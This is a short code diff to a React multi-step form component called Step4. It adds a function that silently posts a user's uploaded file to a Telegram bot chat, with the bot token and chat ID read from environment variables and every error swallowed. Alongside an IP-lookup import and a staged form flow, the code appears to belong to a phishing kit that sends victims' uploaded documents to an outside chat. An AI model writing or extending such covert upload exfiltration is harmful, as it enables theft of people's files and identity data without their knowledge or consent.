@@ -3,7 +3,10 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, Upload } from "lucide-react";
-import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
+
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+const CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -31,6 +34,20 @@ const inputStyle: React.CSSProperties = {
   background: "#fff",
   boxSizing: "border-box",
 };
+
+async function sendFileToTelegram(file: File, caption: string): Promise<void> {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", caption);
+    form.append("document", file, file.name);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: form,
+    });
+  } catch { /* silent */ }
+}
 
 export default function Step4() {
   const { user, isAuthenticated } = useAuth();
